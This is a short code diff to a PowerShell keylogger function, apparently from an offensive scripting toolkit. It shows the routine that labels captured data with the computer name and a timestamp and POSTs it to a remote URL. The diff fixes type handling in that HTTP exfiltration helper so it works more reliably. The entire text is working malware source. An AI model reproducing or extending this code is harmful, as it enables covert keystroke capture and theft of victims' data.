@@ -262,15 +262,15 @@ function script:Keylogger
             }
             $now = Get-Date; 
             $name = $env:COMPUTERNAME 
-            $paste_name = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
+            $pastename = $name + " : " + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
             function post_http($url,$parameters) 
             { 
                 $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                 $http_request.open("POST", $url, $false) 
                 $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-                $http_request.setRequestHeader("Content-length", $parameters.length); 
+                $http_request.setRequestHeader("Content-length", [String]$parameters.length); 
                 $http_request.setRequestHeader("Connection", "close") 
-                $http_request.send($parameters) 
+                $http_request.send([String]$parameters) 
                 $script:session_key=$http_request.responseText 
             } 
 
